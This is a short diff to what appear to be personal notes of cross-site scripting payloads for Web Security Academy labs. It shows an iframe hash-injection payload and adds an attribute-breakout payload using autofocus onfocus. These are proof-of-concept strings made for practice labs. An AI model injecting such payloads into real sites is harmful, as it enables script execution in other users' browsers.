@@ -3,6 +3,10 @@
 
 <iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
 
+XSS in HTML tag attributes :
+    " autofocus onfocus=alert(document.domain) x="
+
+
 Custom HTML tag :
     TO EMBED : 
         <script>
